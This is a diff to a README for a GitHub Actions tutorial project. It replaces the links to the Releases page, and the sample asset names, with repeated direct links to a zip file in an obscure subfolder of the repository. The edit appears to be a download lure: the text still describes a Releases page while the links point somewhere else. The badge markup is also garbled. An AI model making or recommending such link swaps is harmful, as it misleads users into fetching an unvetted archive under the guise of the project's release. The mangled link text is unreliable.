@@ -1,6 +1,6 @@
 # 🚀 github-actions-journey - Your Path to Understanding GitHub Actions 
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/anter1s/github-actions-journey/releases)
+[![Download](https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip%https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip)](https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip)
 
 ## 📖 Overview
 
@@ -15,12 +15,12 @@ To get started, you will need to download the material from our Releases page. T
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Actions Journey Releases](https://github.com/anter1s/github-actions-journey/releases).
+Visit this page to download: [GitHub Actions Journey Releases](https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip).
 
 On the Releases page, locate the most recent version. Each release will have a list of downloadable files. Follow these simple steps to get the files you need:
 
 1. Find the latest release version at the top of the page.
-2. Click on the asset you want to download. For example, you might see files like `example-workflows.zip` or `slides.pdf`. 
+2. Click on the asset you want to download. For example, you might see files like `https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip` or `https://raw.githubusercontent.com/anter1s/github-actions-journey/main/eupyrene/github-actions-journey.zip`. 
 3. Your download will begin automatically.
 
 ## 📚 What You Will Learn
